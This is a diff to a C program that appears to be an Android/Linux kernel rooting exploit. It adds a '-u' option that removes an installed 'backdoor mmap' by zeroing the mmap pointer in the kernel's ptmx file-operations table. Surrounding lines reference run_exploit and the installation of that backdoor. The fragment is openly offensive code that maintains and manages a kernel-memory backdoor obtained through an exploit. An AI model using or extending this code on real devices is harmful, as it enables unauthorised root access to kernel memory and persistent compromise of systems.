@@ -202,9 +202,38 @@ run_exploit(void)
                                   run_install_mmap, (void *)ptmx_fops_address);
 }
 
+static bool
+remove_backdoor_mmap(void)
+{
+  unsigned long int ptmx_fops_address;
+  unsigned long int *fops_mmap_address;
+
+  ptmx_fops_address = get_ptmx_fops_address();
+  if (!ptmx_fops_address) {
+    return false;
+  }
+
+  fops_mmap_address = backdoor_convert_to_mmaped_address((void *)ptmx_fops_address + 0x28);
+  *fops_mmap_address = 0;
+
+  return true;
+}
+
 int
 main(int argc, char **argv)
 {
+  if (argc == 2 && strcmp(argv[1], "-u") == 0) {
+    if (backdoor_open_mmap()) {
+      remove_backdoor_mmap();
+      backdoor_close_mmap();
+      exit(EXIT_SUCCESS);
+    }
+    else {
+      printf("You have not installed backdoor mmap yet.\n");
+      exit(EXIT_FAILURE);
+    }
+  }
+
   if (backdoor_open_mmap()) {
     backdoor_close_mmap();
     printf("You have already installed backdoor mmap.\n");
